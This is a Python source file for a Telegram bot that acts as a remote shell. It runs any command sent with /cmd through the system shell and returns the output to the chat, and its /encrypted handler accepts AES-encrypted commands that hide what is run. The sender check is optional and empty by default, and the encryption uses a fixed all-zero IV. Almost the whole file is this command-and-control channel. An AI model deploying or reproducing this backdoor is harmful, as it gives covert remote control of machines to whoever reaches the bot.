from telegram.ext import Updater, CommandHandler
from telegram.ext.dispatcher import run_async
from Crypto.Cipher import AES
import subprocess
import datetime
import config
import base64
import sys


configured_username = ""


def decrypt_text(encrypted_text):
	try:
		enc = base64.b64decode(encrypted_text)
		cipher = AES.new(config.aes_key, AES.MODE_CBC, chr(0) * 16) # yes, IV is all zeros xD
		dec = cipher.decrypt(enc)
		unpad = lambda s: s[:-ord(s[len(s)-1:])]
		return unpad(dec).decode('utf-8')
	except:
		now = datetime.datetime.now()
		print("[%02d:%02d:%02d] AES decryption was unsuccessful"%(now.hour,now.minute,now.second))
		return "echo 'AES decryption was unsuccessful'"


def exec_cmd(command):
	try:
		sub_ = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
		subprocess_return = sub_.stdout.read()
		return subprocess_return.decode("utf-8") 
	except:
		return "There was an error executing the command"


def encrypted(update, context):
	msg_username = update.message.from_user.username
	if configured_username != "" and msg_username != configured_username:
		print("[-] ERROR: Message received from %s but the script only allows requests from user %s"%(msg_username, configured_username))
		return
	chat_id = update.message.chat_id
	command = decrypt_text(" ".join(context.args))
	subprocess_return = exec_cmd(command)
	context.bot.sendMessage(chat_id, subprocess_return)


def cmd(update, context):
	msg_username = update.message.from_user.username
	if configured_username != "" and msg_username != configured_username:
		print("[-] ERROR: Message received from %s but the script only allows requests from user %s"%(msg_username, configured_username))
		return
	chat_id = update.message.chat_id
	command = " ".join(context.args)
	subprocess_return = exec_cmd(command)
	context.bot.sendMessage(chat_id, subprocess_return)


def main():
	global configured_username
	if len(sys.argv) >= 2:
		token = sys.argv[1]
	else:
		token = config.telegram_token
	if len(sys.argv) >= 3:
		configured_username = sys.argv[2]
	else:
		configured_username = config.telegram_username
	if token == "":
		print("[-] ERROR: It is necessary to use the Telegram bot token as input parameter or add the value to the parameter 'telegram_token' in config.py")
		sys.exit(1)
	updater = Updater(token, use_context=True)
	dp = updater.dispatcher
	dp.add_handler(CommandHandler('cmd',cmd))
	dp.add_handler(CommandHandler('encrypted',encrypted))
	updater.start_polling()
	updater.idle()


if __name__ == '__main__':
    main()